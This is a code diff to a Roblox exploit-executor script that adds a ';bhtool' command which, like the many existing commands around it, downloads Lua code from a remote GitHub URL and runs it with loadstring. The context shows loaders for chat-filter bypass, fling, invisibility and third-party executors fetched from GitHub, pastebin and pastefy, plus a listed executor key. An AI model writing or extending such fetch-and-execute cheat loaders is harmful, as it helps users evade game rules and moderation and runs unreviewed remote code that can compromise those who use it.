@@ -249,7 +249,7 @@ end
 --[[ EXECUTOR COMMANDS ]]--
 local commands = {
     ";avtor", ";gh", ";na2", ";inf", ";na1", ";le", ";tfling", ";fly", ";fly2", ";qcmd",
-    ";tfling2", ";bp1", ";bp2", ";bp3", ";bp4", ";tel1", ";tel2", ";glios", ";cmds", ";hth",
+    ";tfling2", ";bp1", ";bp2", ";bp3", ";bp4", ";bhtool", ";tel1", ";tel2", ";glios", ";cmds", ";hth",
     ";zomb", ";search", ";knpc", ";jerk", ";punch", ";invis2", ";invis", ";tel3", ";roa", ";akp1", ";akp2",
     ";prox", ";rochips", ";fc1", ";fc2", "synapse", ";synapse2", ";krnl", ";krnlk", ";bypass", ";fc3", ";rp", ";rp2", ";srp", ";srp2", ";tictactoe", ";illus", ";toolgui", ";keyb", ";wibtt", ";acl", ";krunox", ";crouch", ";srp3", ";srp4", ";tptool",
     ";rc7 (key: MegaSecretPasswordForRC7)",
@@ -277,6 +277,8 @@ executeButton.MouseButton1Click:Connect(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/krnlnoui.lua"))()
     elseif codeToExecute == ";krnlk" then
         loadstring(game:HttpGet("https://pastebin.com/raw/RJe1HXrQ"))()
+    elseif codeToExecute == ";bhtool" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/evilionx3/blackholetool/refs/heads/main/skibidi.lua"))()
     elseif codeToExecute == ";bypass" then
         loadstring(game:HttpGet'https://raw.githubusercontent.com/m1kp0/universal_scripts/refs/heads/main/chat_bypass.lua')()
     elseif codeToExecute == ";acl" then
@@ -525,6 +527,8 @@ cc = game.Players.LocalPlayer.Chatted:Connect(function(msg)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Super-ring-parts-without-massage/refs/heads/main/Super%20ring%20parts"))()
     elseif spaceSplit[1] == ";rp2" then
         loadstring(game:HttpGet("https://pastefy.app/hdd1kF9c/raw"))("T.me/AvtorScripts")
+    elseif spaceSplit[1] == ";bhtool" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/evilionx3/blackholetool/refs/heads/main/skibidi.lua"))()
     elseif spaceSplit[1] == ";na1" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Silly-Exploiter/NamedAdmin/main/bamed%20admen.txt"))()
     elseif spaceSplit[1] == ";le" then
